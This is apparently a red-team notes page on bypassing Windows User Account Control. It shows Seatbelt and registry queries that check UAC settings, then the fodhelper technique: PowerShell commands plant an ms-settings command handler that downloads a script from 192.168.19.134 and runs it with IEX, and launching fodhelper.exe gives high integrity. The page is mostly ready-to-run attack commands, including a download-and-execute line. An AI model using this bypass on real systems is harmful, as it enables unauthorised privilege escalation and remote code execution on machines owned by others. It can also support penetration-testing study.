---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/privilege-escalation/windows/uac-bypass
---

# UAC Bypass

<figure><img src="../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Seatbelt.exe

```basic
C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac

====== UAC ======

ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
EnableLUA (Is UAC enabled?)    : 1
```

### Registry

We can see REG\_**DWORD 0x1**

```basic
C:\>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

We can see REG\_DWORD 0x5

```basic
C:\>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

Create registry keys and launch PowerShell. Registry key names are limited to **255** characters, registry value names are limited to **16383** characters, and the value itself is only limited by the available system memory.

```powershell
PS C:\> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.19.134/run.txt') | IEX" -Force

PS C:\> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
```

Then execute, we will prompt with **High Level Integritiy**

```powershell
C:\Windows\System32\fodhelper.exe
```
